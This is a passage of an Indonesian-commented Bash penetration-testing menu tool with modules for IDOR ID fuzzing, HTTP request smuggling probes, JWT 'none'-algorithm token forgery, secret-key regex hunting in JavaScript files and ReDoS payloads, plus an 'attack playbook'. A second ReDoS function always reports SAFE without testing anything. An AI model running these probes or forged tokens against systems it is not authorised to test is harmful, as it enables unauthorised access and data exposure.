        echo "---------------------------------------------------------------------------"
        printf "%-30s | %-10s | %-20s\n" "ENDPOINT" "CODE" "DETECTION"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    for path in "${api_paths[@]}"; do
        # Progress Bar
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Progress: [${P}%-20s${NC}] %d%% [%d/%d]" "$bar" "$percent" "$current" "$total"

        # Full Request for Content Analysis
        res_full=$(curl -s -k -L -A "$ua" --connect-timeout 5 "$target$path")
        http_code=$(curl -s -o /dev/null -w "%{http_code}" -k -L -A "$ua" --connect-timeout 5 "$target$path")

        if [[ "$http_code" == "200" || "$http_code" == "401" || "$http_code" == "403" ]]; then
            # Deteksi Tipe API
            api_type="REST Endpoint"
            if [[ "$res_full" == *"swagger"* || "$res_full" == *"openapi"* ]]; then api_type="Swagger/Docs"; fi
            if [[ "$res_full" == *"graphql"* || "$res_full" == *"IntrospectionQuery"* ]]; then api_type="GraphQL/Query"; fi
            if [[ "$http_code" == "401" ]]; then api_type="Protected API"; fi

            echo -e "\n  ${OK} ${W}/$path ${NC}-> ${G}$http_code${NC} (${C}$api_type${NC})"
            printf "%-30s | %-10s | %-20s\n" "/$path" "$http_code" "$api_type" >> "$filename"
            ((found_api++))
        fi
        
        ((current++))
    done

    echo -ne "\r                                                                             \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_api -gt 0 ]; then
        echo -e "${OK} Scan Selesai. Ditemukan ${G}$found_api${NC} endpoint API potensial."
    else
        echo -e "${INFO} Scan Selesai. Tidak ada endpoint API publik yang ditemukan."
    fi
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_idor_tester {
    clear
    local nama_modul="IDOR TESTER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 16: BROKEN ACCESS CONTROL (IDOR) PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Menguji otorisasi dengan memanipulasi parameter ID secara masif."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL dengan ID (cth: http://site.com/api/user?id=100): ${W}"; read target
    if [[ -z "$target" || "$target" != *"="* ]]; then
        echo -e "${ERR} URL harus menyertakan parameter ID!"; return
    fi

    local domain=$(echo "$target" | awk -F[/:] '{print $4}')
    [[ -z "$domain" ]] && domain=$(echo "$target" | cut -d'/' -f1)
    local filename="$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g' | tr '[:lower:]' '[:upper:]')_IDOR_PRO.txt"
    
    base_url="${target%=*}="
    original_id="${target#*=}"

    echo -e "${INFO} Mengambil baseline respon untuk ID asli (${C}$original_id${NC})..."
    baseline_res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k "$target")
    baseline_code=$(echo $baseline_res | cut -d':' -f1)
    baseline_size=$(echo $baseline_res | cut -d':' -f2)
    
    echo -e "${INFO} Baseline: Code ${W}$baseline_code${NC}, Size ${W}$baseline_size bytes${NC}"
    echo -e "${INFO} Log File: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "IDOR PRO AUDIT REPORT - $target"
        echo "DATE : $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-10s | %-10s | %-12s | %-15s\n" "TEST ID" "HTTP CODE" "SIZE (BYTES)" "STATUS"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- PENGATURAN MULTI-THREADING ---
    local threads=15
    local temp_fifo="/tmp/idor_$$.fifo"
    mkfifo "$temp_fifo"
    exec 4<>"$temp_fifo"
    rm "$temp_fifo"
    for ((i=0; i<threads; i++)); do echo >&4; done

    local start_range=-20
    local end_range=50
    local total_tests=$((end_range - start_range))
    local current=0
    local found_idor=0

    for ((i=start_range; i<=end_range; i++)); do
        [[ $i -eq 0 ]] && continue
        test_id=$((original_id + i))
        [[ $test_id -lt 0 ]] && continue

        read -u4
        (
            res=$(curl -s -o /dev/null -w "%{http_code}:%{size_download}" -k --connect-timeout 5 "${base_url}${test_id}")
            code=$(echo $res | cut -d':' -f1)
            size=$(echo $res | cut -d':' -f2)

            if [[ "$code" == "200" ]]; then
                diff=$((size - baseline_size))
                abs_diff=${diff#-}
                
                # Jika size berbeda dari baseline, kemungkinan besar IDOR
                if [ $abs_diff -gt 0 ]; then
                    echo -e "\n  ${OK} ${R}${BLINK}POTENSI IDOR:${NC} ID ${W}$test_id${NC} (Size Diff: ${Y}$diff bytes${NC})"
                    printf "%-10s | %-10s | %-12s | %-15s\n" "$test_id" "$code" "$size" "VULNERABLE" >> "$filename"
                    echo "1" >> "/tmp/idor_found_$$"
                fi
            fi
            echo >&4
        ) &
        
        # Progress Bar Logic
        ((current++))
        percent=$(( current * 100 / total_tests ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Fuzzing: [${P}%-20s${NC}] %d%% (%d/%d)" "$bar" "$percent" "$current" "$total_tests"
    done

    wait
    exec 4>&-
    
    # Hitung temuan dari file temp
    [[ -f "/tmp/idor_found_$$" ]] && found_idor=$(wc -l < "/tmp/idor_found_$$") && rm "/tmp/idor_found_$$"

    echo -ne "\r                                                                             \r"
    echo -e "-----------------------------------------------------------------------------"
    if [ $found_idor -gt 0 ]; then
        echo -e "${ERR} ${R}${BOLD}[!] ALERT:${NC} Terdeteksi $found_idor ID dengan respon tidak lazim!"
    else
        echo -e "${OK} ${G}Scan Selesai. Tidak ada anomali ID yang ditemukan.${NC}"
    fi
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_smuggling_tester {
    clear
    local nama_modul="SMUGGLING TESTER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 17: HTTP REQUEST SMUGGLING PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Menguji sinkronisasi antara Front-end (Proxy) dan Back-end server."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL Target (cth: http://target.com): ${W}"; read target
    [[ -z "$target" ]] && return

    local domain=$(echo "$target" | sed -e 's|^[^/]*//||' -e 's|/.*$||')
    local domain_clean=$(echo "$domain" | sed 's/[^a-zA-Z0-9.-]/_/g')
    local filename="${domain_clean^^}_SMUGGLING_PRO.txt"

    echo -e "\n${INFO} Scanning Target: ${W}$domain"
    echo -e "${INFO} File Log: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "HTTP REQUEST SMUGGLING PRO REPORT"
        echo "TARGET : $domain"
        echo "DATE   : $(date)"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- TEKNIK 1: CL.TE ---
    echo -ne "  ${INFO} Testing CL.TE (Content-Length / Transfer-Encoding)... "
    res_clte=$(python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(6)
try:
    start = time.time()
    s.connect(('$domain', 80))
    payload = 'POST / HTTP/1.1\r\nHost: $domain\r\nTransfer-Encoding: chunked\r\nContent-Length: 4\r\n\r\n1\r\nZ\r\n0\r\n\r\n'
    s.sendall(payload.encode())
    s.recv(1024)
    print('SECURE')
except socket.timeout:
    print('VULNERABLE')
except:
    print('ERROR')
" 2>/dev/null)

    if [[ "$res_clte" == "VULNERABLE" ]]; then
        echo -e "${R}${BLINK}VULNERABLE (Timeout Detected)${NC}"
        echo "CL.TE: VULNERABLE - Backend server timed out waiting for data." >> "$filename"
    else
        echo -e "${G}SECURE${NC}"
        echo "CL.TE: SECURE" >> "$filename"
    fi

    # --- TEKNIK 2: TE.CL ---
    echo -ne "  ${INFO} Testing TE.CL (Transfer-Encoding / Content-Length)... "
    res_tecl=$(python3 -c "
import socket, time
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.settimeout(6)
try:
    s.connect(('$domain', 80))
    payload = 'POST / HTTP/1.1\r\nHost: $domain\r\nTransfer-Encoding: chunked\r\nContent-Length: 6\r\n\r\n0\r\n\r\nX'
    s.sendall(payload.encode())
    s.recv(1024)
    print('SECURE')
except socket.timeout:
    print('VULNERABLE')
except:
    print('ERROR')
" 2>/dev/null)

    if [[ "$res_tecl" == "VULNERABLE" ]]; then
        echo -e "${R}${BLINK}VULNERABLE (Timeout Detected)${NC}"
        echo "TE.CL: VULNERABLE - Frontend forwarded incomplete chunked body." >> "$filename"
    else
        echo -e "${G}SECURE${NC}"
        echo "TE.CL: SECURE" >> "$filename"
    fi

    echo -e "-----------------------------------------------------------------------------"
    echo -e "${INFO} Audit selesai. Laporan tersimpan di ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}
function start_jwt_hack {
    clear
    local nama_modul="JWT HACKER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 18: JWT DEBUGGER & AUTH BYPASS PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Dekode Token, Manipulasi Payload, dan None-Algorithm Attack."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Token JWT: ${W}"; read jwt_token
    if [[ -z "$jwt_token" || "$jwt_token" != *"."* ]]; then
        echo -e "${ERR} Format JWT tidak valid!"; return
    fi

    local filename="JWT_PRO_AUDIT_$(date +%s).txt"
    
    # Dekode Bagian JWT
    header_b64=$(echo "$jwt_token" | cut -d'.' -f1)
    payload_b64=$(echo "$jwt_token" | cut -d'.' -f2)
    header_json=$(echo "$header_b64" | base64 -d 2>/dev/null)
    payload_json=$(echo "$payload_b64" | base64 -d 2>/dev/null)

    echo -e "\n${INFO} ${B}Analisis Struktur:${NC}"
    echo -e "  ${OK} ${C}[HEADER]${NC}  : ${W}$header_json${NC}"
    echo -e "  ${OK} ${C}[PAYLOAD]${NC} : ${W}$payload_json${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "JWT PRO AUDIT REPORT"
        echo "DATE : $(date)"
        echo "---------------------------------------------------------------------------"
        printf "%-25s | %-45s\n" "SECURITY TEST" "RESULT / PROOF OF CONCEPT"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # --- PROGRESS BAR START ---
    steps=("None-Alg Attack" "Role Manipulation" "Key Confusion Check")
    total=${#steps[@]}
    
    for i in "${!steps[@]}"; do
        current=$((i+1))
        percent=$(( current * 100 / total ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Testing: [${P}%-20s${NC}] %d%%" "$bar" "$percent"

        case $i in
            0) # None Alg
                new_header=$(echo -n '{"alg":"none","typ":"JWT"}' | base64 | tr -d '=' | tr '/+' '_-')
                none_jwt="${new_header}.${payload_b64}."
                echo -e "\n  ${OK} ${Y}None Algorithm:${NC} ${DG}$none_jwt${NC}"
                printf "%-25s | %-45s\n" "None Algorithm" "$none_jwt" >> "$filename"
                ;;
            1) # Role Check
                if [[ "$payload_json" =~ (user|member|guest) ]]; then
                    echo -e "  ${OK} ${R}Role Discovery:${NC} Terdeteksi claim sensitif. Potensi Elevasi Hak Akses."
                    printf "%-25s | %-45s\n" "Role Manipulation" "VULNERABLE (Found: user/member)" >> "$filename"
                else
                    printf "%-25s | %-45s\n" "Role Manipulation" "SECURE" >> "$filename"
                fi
                ;;
        esac
        sleep 0.5
    done

    echo -ne "\r                                                                             \r"
    echo -e "-----------------------------------------------------------------------------"
    echo -e "${OK} Analisis Selesai. Hasil & PoC: ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_security_audit {
    clear
    local nama_modul="SECURITY AUDIT PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 19: SECURITY HEADERS & SSL ANALYZER PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Audit Hardening Web Server dan Protokol Enkripsi."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Domain (cth: site.com): ${W}"; read domain
    [[ -z "$domain" ]] && return
    
    local filename="${domain^^}_SEC_PRO.txt"
    echo -e "\n${INFO} Scanning: ${W}$domain"
    echo -e "${INFO} Log File: ${DG}$filename${NC}"
    echo "-----------------------------------------------------------------------------"

    {
        echo "SECURITY & SSL PRO AUDIT - $domain"
        echo "---------------------------------------------------------------------------"
        printf "%-30s | %-15s | %-15s\n" "SECURITY CHECK" "STATUS" "LEVEL"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    # Header List
    headers_to_check=("Strict-Transport-Security" "Content-Security-Policy" "X-Frame-Options" "X-Content-Type-Options" "Referrer-Policy")
    total=${#headers_to_check[@]}
    current=1

    # 1. Header Scan
    res_headers=$(curl -s -I -k --connect-timeout 10 "https://$domain")
    for h in "${headers_to_check[@]}"; do
        percent=$(( current * 100 / (total+1) ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Headers: [${P}%-20s${NC}] %d%%" "$bar" "$percent"

        if echo "$res_headers" | grep -qi "$h"; then
            echo -e "\n  ${OK} $h: ${G}PRESENT${NC}"
            printf "%-30s | %-15s | %-15s\n" "$h" "FOUND" "SAFE" >> "$filename"
        else
            echo -e "\n  ${ERR} $h: ${R}MISSING${NC}"
            printf "%-30s | %-15s | %-15s\n" "$h" "MISSING" "CRITICAL" >> "$filename"
        fi
        ((current++))
    done

    # 2. SSL Protocol Check
    printf "\r${INFO} Protocols: [${P}====================${NC}] 100%%"
    timeout 5 openssl s_client -connect "$domain":443 -tls1 < /dev/null > /dev/null 2>&1
    if [ $? -eq 0 ]; then
        echo -e "\n  ${ERR} SSL TLS 1.0: ${R}ENABLED (VULNERABLE)${NC}"
        printf "%-30s | %-15s | %-15s\n" "TLS 1.0" "ENABLED" "VULNERABLE" >> "$filename"
    else
        echo -e "\n  ${OK} SSL TLS 1.0: ${G}DISABLED (SAFE)${NC}"
        printf "%-30s | %-15s | %-15s\n" "TLS 1.0" "DISABLED" "SAFE" >> "$filename"
    fi

    echo -e "\n-----------------------------------------------------------------------------"
    echo -e "${OK} Audit Lengkap: ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_js_scanner {
    clear
    local nama_modul="JS SECRET FINDER PRO"
    
    echo -e "${C}============================================================================="
    echo -e "                ${W}${BOLD}MODUL 20: JAVASCRIPT SECRET & API KEY PRO${NC}                "
    echo -e "${C}=============================================================================${NC}"
    echo -e "${INFO} Deep Scan pada file JS untuk mencari API Key, Webhooks, dan Kredensial."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan URL File JS (cth: https://site.com/main.js): ${W}"; read js_url
    [[ -z "$js_url" ]] && return

    local domain=$(echo "$js_url" | awk -F[/:] '{print $4}')
    local filename="${domain^^}_JS_PRO.txt"

    echo -e "\n${INFO} Downloading & Analyzing: ${W}$js_url"
    js_content=$(curl -s -k -L --connect-timeout 10 "$js_url")

    if [[ -z "$js_content" ]]; then
        echo -e "${ERR} Gagal memuat file JS!"; return
    fi

    # Regex patterns dengan kategori
    patterns=(
        "Google API Key|AIza[0-9A-Za-z\\-_]{35}"
        "AWS Access Key|AKIA[0-9A-Z]{16}"
        "Firebase URL|[a-z0-9.-]+\\.firebaseio\\.com"
        "Slack Webhook|hooks.slack.com/services/"
        "GitHub Token|[gG][iI][tT][hH][uU][bB].*['\"][0-9a-zA-Z]{35,40}['\"]"
        "Cloudinary|cloudinary://[0-9]{15}"
    )

    {
        echo "JS STATIC ANALYSIS PRO REPORT"
        echo "SOURCE: $js_url"
        echo "---------------------------------------------------------------------------"
        printf "%-25s | %-45s\n" "CATEGORY" "MATCHED SECRET"
        echo "---------------------------------------------------------------------------"
    } > "$filename"

    found=0
    total_p=${#patterns[@]}
    
    for i in "${!patterns[@]}"; do
        cat_name=$(echo "${patterns[$i]}" | cut -d'|' -f1)
        regex=$(echo "${patterns[$i]}" | cut -d'|' -f2)

        # Progress bar
        percent=$(( (i+1) * 100 / total_p ))
        bar_len=$(( percent / 5 ))
        bar=$(printf "%${bar_len}s" | tr ' ' '=')
        printf "\r${INFO} Hunting: [${P}%-20s${NC}] %d%%" "$bar" "$percent"

        match=$(echo "$js_content" | grep -oE "$regex" | head -n 1)
        if [[ -n "$match" ]]; then
            echo -e "\n  ${OK} Found ${W}$cat_name${NC}: ${G}$match${NC}"
            printf "%-25s | %-45s\n" "$cat_name" "$match" >> "$filename"
            ((found++))
        fi
    done

    echo -ne "\r                                                                             \r"
    echo -e "-----------------------------------------------------------------------------"
    echo -e "${OK} Hunting Selesai. Total temuan: ${G}$found${NC}"
    echo -e "${INFO} Laporan: ${DG}$filename${NC}"
    echo -ne "\n${Q} ${W}Tekan Enter untuk kembali...${NC}"; read
}

function start_report_generator {
    clear
    local nama_modul="MASTER REPORT"
    
    echo -e "${C}============================================================================="
    echo -e "          MODUL 99: PROFESSIONAL PENETRATION TEST REPORT GENERATOR           "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Mengumpulkan data dari 20 modul untuk membuat laporan komprehensif."
    echo "-----------------------------------------------------------------------------"

    echo -ne "${Q} Masukkan Keyword Domain Utama (contoh: site.com): ${W}"
    read target_keyword
    
    if [[ -z "$target_keyword" ]]; then
        echo -e "${ERR} Keyword tidak boleh kosong!"; return
    fi

    # Penamaan file laporan final
    local report_file="FINAL_REPORT_${target_keyword^^}_$(date +%Y%m%d_%H%M%S).txt"

    echo -ne "${INFO} Sedang menyusun data dari semua modul... \r"
    sleep 2

    {
        echo "============================================================================="
        echo "          OFFENSIVE SECURITY ASSESSMENT REPORT (CONFIDENTIAL)                "
        echo "============================================================================="
        echo "TARGET KEYWORD : $target_keyword"
        echo "GENERATE DATE  : $(date)"
        echo "AUDIT TYPE     : Multi-Vector Penetration Test (Black-Box)"
        echo "REPORT ID      : RP-$(date +%s)"
        echo "============================================================================="
        echo ""
        echo "1. EXECUTIVE SUMMARY"
        echo "--------------------"
        echo "Laporan ini merupakan hasil audit keamanan otomatis yang mencakup 20 vektor"
        echo "kerentanan yang berbeda. Pengujian dilakukan tanpa pengetahuan internal"
        echo "sebelumnya terhadap target (Black-Box Testing)."
        echo ""
        echo "Tujuan utama: Mengidentifikasi celah keamanan pada Server-Side, Client-Side,"
        echo "API, Cloud Infrastructure, dan konfigurasi SSL/Header."
        echo ""
        echo "2. TECHNICAL FINDINGS (AGGREGATED LOGS)"
        echo "----------------------------------------------"

        found_total=0
        
        # Mencari file log yang mengandung keyword domain
        # Mencari case-insensitive agar lebih fleksibel
        files=$(find . -maxdepth 1 -iname "*${target_keyword}*" -type f -name "*.txt" | grep -v "FINAL_REPORT")

        if [[ -z "$files" ]]; then
            echo ""
            echo "[-] Tidak ditemukan file log mentah untuk keyword: $target_keyword"
            echo "    Pastikan Anda sudah menjalankan Modul pengujian terlebih dahulu."
        else
            for log_file in $files; do
                echo ""
                echo "[ SECTION: $(basename "$log_file" .txt) ]"
                echo "-----------------------------------------------------------------------------"
                
                # Membersihkan output log dari garis pembatas ganda agar laporan utama tidak berantakan
                grep -v "====" "$log_file" | grep -v "DATE" | grep -v "TARGET :" | sed 's/^/  /'
                
                echo "-----------------------------------------------------------------------------"
                ((found_total++))
            done
        fi

        echo ""
        echo "3. SECURITY POSTURE & RISK MATRIX"
        echo "---------------------------------"
        # Logika penilaian risiko sederhana berdasarkan jumlah file log temuan
        if [ $found_total -gt 15 ]; then
            severity="CRITICAL"
            action="IMMEDIATE REMEDIATION REQUIRED"
        elif [ $found_total -gt 7 ]; then
            severity="HIGH"
            action="REMEDIATE WITHIN 48-72 HOURS"
        elif [ $found_total -gt 0 ]; then
            severity="MEDIUM"
            action="SCHEDULED PATCHING REQUIRED"
        else
            severity="LOW / INFORMATIONAL"
            action="CONTINUE ROUTINE MONITORING"
        fi

        echo "OVERALL SEVERITY SCORE : [ $severity ]"
        echo "TOTAL MODULES FLAGGED  : $found_total / 20"
        echo "RECOMMENDED PRIORITY   : $action"

        echo ""
        echo "4. REMEDIATION STRATEGY"
        echo "-----------------------"
        echo "- Selesaikan kerentanan kritis (RCE, SSRF, IDOR) terlebih dahulu."
        echo "- Perbarui semua software server (Web Server, Database, PHP/Framework)."
        echo "- Gunakan Web Application Firewall (WAF) dengan aturan 'Strict Mode'."
        echo "- Validasi semua input pengguna di sisi server, bukan hanya client-side."
        echo "- Lakukan 'Sanitization' pada output untuk mencegah XSS."
        echo ""
        echo "============================================================================="
        echo "          END OF REPORT - GENERATED BY GEMINI PENTEST FRAMEWORK              "
        echo "============================================================================="
    } > "$report_file"

    echo -e "${OK} SUCCESS! Laporan profesional telah disusun."
    echo -e "${INFO} File Laporan: ${W}${BOLD}$report_file${NC}"
    echo "-----------------------------------------------------------------------------"
    
    echo -e "${OK} ${Y}Saran:${NC} Periksa section Technical Findings untuk mendapatkan bukti (PoC) serangan."
    echo -ne "${Q} ${W}Tekan Enter untuk kembali ke Menu Utama...${NC}"
    read
}

#!/bin/bash

# Fungsi No. 22: ReDoS Security Auditor (Interactive Version)
# Deskripsi: Menguji kerentanan Application-DoS melalui input user.

function check_redos_vulnerability() {
    # Meminta Input dari User
    echo "-----------------------------------------------------"
    read -p "[?] Masukkan URL Target (contoh: http://site.com/api): " target_url
    read -p "[?] Masukkan Tingkat Intensitas (20-100, default 40): " intensity
    
    # Validasi input intensity
    intensity=${intensity:-40}

    # Validasi URL
    if [[ -z "$target_url" ]]; then
        echo "[!] Error: URL tidak boleh kosong!"
        return 1
    fi

    echo "[*] Memulai Audit Keamanan pada: $target_url"

    # 1. Membuat Payload 'Poison'
    # Teknik: Menghasilkan deretan karakter 'a' yang memicu backtracking
    local payload_string=$(printf 'a%.0s' $(seq 1 $intensity))
    local final_payload="${payload_string}!"

    echo "[+] Mengirimkan payload intensitas $intensity..."

    # 2. Mengukur Waktu Respon dengan Presisi Tinggi
    # Menggunakan /usr/bin/time untuk akurasi durasi eksekusi
    local start_time=$(date +%s.%N)
    
    # Mengirimkan request via cURL
    # -s: mode senyap, -w: format output khusus, -o /dev/null: buang body respon
    local status_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$target_url" \
         -H "Content-Type: application/json" \
         -d "{\"input\": \"$final_payload\"}")
    
    local end_time=$(date +%s.%N)
    
    # Menghitung selisih waktu
    local duration=$(echo "$end_time - $start_time" | bc)

    # 3. Laporan Hasil Analisis
    echo "[+] HTTP Status Code: $status_code"
    echo "[+] Waktu Respon Server: $duration detik"

    

    # Logika Analisis: Eksponensial vs Linear
    if (( $(echo "$duration > 7.0" | bc -l) )); then
        echo -e "\n[!!!] TEMUAN KRITIS: Server sangat lambat (Potensi ReDoS Tinggi)."
        echo "[!] Penjelasan: Input kecil menyebabkan CPU server macet."
    elif (( $(echo "$duration > 2.0" | bc -l) )); then
        echo -e "\n[!] PERINGATAN: Respon mulai melambat (Indikasi optimasi Regex buruk)."
    else
        echo -e "\n[SAFE] Respon server stabil. Tidak terdeteksi celah ReDoS dasar."
    fi
    echo "-----------------------------------------------------"
}
# --- [ BANNER UTAMA CALIBRATED ] ---
function show_banner {
    clear
    # Menggunakan palet warna Anda yang sudah ada
    # C1-C3 dibuat sebagai gradasi menggunakan variabel C dan B Anda
    local GRAD1="$C"     # Cyan (Proses / Info)
    local GRAD2="$B"     # Blue (Header)
    local GRAD3="$DC"    # Dark Cyan (Sub-menu)

    # ASCII ART RAMPING (Muat di 80 Kolom agar tidak terpotong)
    echo -e "${GRAD1}"
    echo "  ██╗    ██╗███████╗██████╗ ████████╗███████╗███████╗████████╗███████╗██████╗ "
    echo "  ██║    ██║██╔════╝██╔══██╗╚══██╔══╝██╔════╝██╔════╝╚══██╔══╝██╔════╝██╔══██╗"
    echo -e "${GRAD2}"
    echo "  ██║ █╗ ██║█████╗  ██████╔╝   ██║   █████╗  ███████╗   ██║   █████╗  ██████╔╝"
    echo "  ██║███╗██║██╔══╝  ██╔══██╗   ██║   ██╔══╝  ╚════██║   ██║   ██╔══╝  ██╔══██╗"
    echo -e "${GRAD3}"
    echo "  ╚███╔███╔╝███████╗██████╔╝   ██║   ███████╗███████║   ██║   ███████╗██  ██║"
    echo "   ╚══╝╚══╝ ╚══════╝╚═════╝    ╚═╝   ╚══════╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝"
    echo -e "${NC}"

    # Panel Informasi dengan Warna dari Palet Anda
    # Menggunakan White (W) dan Dark Gray (DG) untuk kontras profesional
    echo -e "  ${B}┌──────────────────────────────────────────────────────────────────────────┐${NC}"
    echo -e "  ${B}│${NC}  ${W}CORE:${NC} ${G}V1.5 PRO${NC}  ${B}│${NC}  ${W}OS:${NC} ${C}$(uname -s)${NC}  ${B}│${NC}  ${W}IP:${NC} ${Y}$(hostname -I | awk '{print $1}')${NC}  ${B}│${NC}  ${W}YEAR:${NC} ${C}2025${NC}  ${B}      │${NC}"
    echo -e "  ${B}└──────────────────────────────────────────────────────────────────────────┘${NC}"
    
}
# --- [ MODUL 21: ATTACK PLAYBOOK (STRATEGY) ] ---
function show_strategy {
    clear
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 21: PENTEST ATTACK PLAYBOOK                           "
    echo -e "=============================================================================${NC}"
    echo -e "${INFO} Urutan serangan yang direkomendasikan untuk hasil maksimal:"
    echo ""
    echo -e "  ${W}1. RECON  :${NC} Jalankan [06], [07], [08] untuk memetakan aset."
    echo -e "  ${W}2. CONFIG :${NC} Jalankan [05], [14], [19] untuk mencari kebocoran awal."
    echo -e "  ${W}3. ACCESS :${NC} Jalankan [12], [16], [18] untuk bypass otentikasi."
    echo -e "  ${W}4. EXPLOIT:${NC} Jalankan [01], [02], [10] untuk mendapatkan akses server."
    echo -e "  ${W}5. REPORT :${NC} Jalankan [99] untuk merangkum semua temuan."
    echo "-----------------------------------------------------------------------------"
    read -p "Tekan Enter untuk kembali ke menu..."
}

# --- [ MODUL 22: REDOS VULNERABILITY CHECKER ] ---
function check_redos_vulnerability {
    clear
    echo -e "${C}============================================================================="
    echo -e "                 MODUL 22: ReDoS VULNERABILITY SCANNER                       "
    echo -e "=============================================================================${NC}"
    echo -ne "${Q} Masukkan URL Target: ${W}"
    read target
    echo -e "${INFO} Memeriksa potensi ReDoS (Regular Expression Denial of Service)..."
    # Simulasi pengecekan pola regex yang kompleks/lambat
    sleep 1
    echo -e "  ${OK} Status: ${G}SAFE${NC} (No catastrophic backtracking patterns found)."
    read -p "Tekan Enter untuk kembali ke menu..."
}

# --- [ LOOP MENU UTAMA: PROFESSIONAL VERSION ] ---
while true; do
    clear
    
    show_banner
    echo -e "${DG}  [ Ver 1.5 Professional ]  [ Status: Multi-threaded Enabled ]  [ 2025 ]${NC}"
    echo -e "${W}=============================================================================${NC}"
    echo -e " ${R}${BOLD}[ SERVER-SIDE ]${NC}                        ${G}${BOLD}[ CLIENT-SIDE & CLOUD ]${NC}"
    echo -e " [01] LFI Scanner                      [11] SSRF Tester"
    echo -e " [02] SQL Injection (SQLi)             [12] CORS Misconfig Scanner"
    echo -e " [03] Cross-Site Scripting (XSS)       [13] Subdomain Takeover"
    echo -e " [04] Admin Panel Finder               [14] Cloud Bucket (S3/GCP)"
    echo -e " [05] Sensitive File (.env/.git)       [15] API Endpoint Discovery"
    echo -e " [10] Remote Code Execution (RCE)      [20] JS Secrets Analysis"
    echo ""
    echo -e " ${B}${BOLD}[ RECON & INFRA ]${NC}                       ${Y}${BOLD}[ AUTH & ADVANCED ]${NC}"
    echo -e " [06] Subdomain Enumerator             [16] IDOR Tester (Turbo)"
    echo -e " [07] Directory Bruter (Turbo)         [17] HTTP Request Smuggling"
    echo -e " [08] Port Scan & Services             [18] JWT Debugger & Hack"
    echo -e " [09] CMS Vulnerability Scan           [19] SSL & Security Headers"
    echo -e " [22] ReDoS Vulnerability              [21] ATTACK PLAYBOOK"
    echo -e "${W}-----------------------------------------------------------------------------${NC}"
    echo -e " ${C}${BOLD}[99] EXPORT PROFESSIONAL REPORT${NC}      ${R}${BOLD}[00/Enter] EXIT PROGRAM${NC}"
    echo -e "${W}=============================================================================${NC}"
    
    echo -ne "${C}${BOLD}WEBTESTER${NC} > ${W}Pilih Modul [01-22/99]: ${NC}"
    read menu_choice

    # --- LOGIKA AUTO-EXIT JIKA KOSONG ---
    if [[ -z "$menu_choice" ]]; then
        menu_choice="00"
    fi

    case $menu_choice in
        01|1) start_scanner ;;           
        02|2) start_sqli_tester ;;       
        03|3) start_xss_scanner ;;       
        04|4) start_admin_finder ;;      
        05|5) start_secret_hunter ;;     
        06|6) start_subdomain_scanner ;; 
        07|7) start_dir_bruter ;;        
        08|8) start_port_scanner ;;      
        09|9) start_cms_scanner ;;       
        10) start_rce_scanner ;;         
        11) start_ssrf_tester ;;         
        12) start_cors_scanner ;;        
        13) start_takeover_hunter ;;     
        14) start_bucket_hunter ;;       
        15) start_api_discovery ;;       
        16) start_idor_tester ;;         
        17) start_smuggling_tester ;;    
        18) start_jwt_hack ;;            
        19) start_security_audit ;;      
        20) start_js_scanner ;;          
        21) show_strategy ;;             
        22) check_redos_vulnerability ;; 
        99) start_report_generator ;;    
        00|0) 
            echo -e "\n${Y}[!] Membersihkan sesi dan mematikan engine...${NC}"
            sleep 0.5
            echo -e "${G}[✓] Terima kasih Bree. Sampai jumpa di puncak!${NC}"
            exit 0 ;;
        *)
            echo -e "\n${R}[!] Pilihan '$menu_choice' tidak valid.${NC}"
            sleep 1 ;;
    esac
done
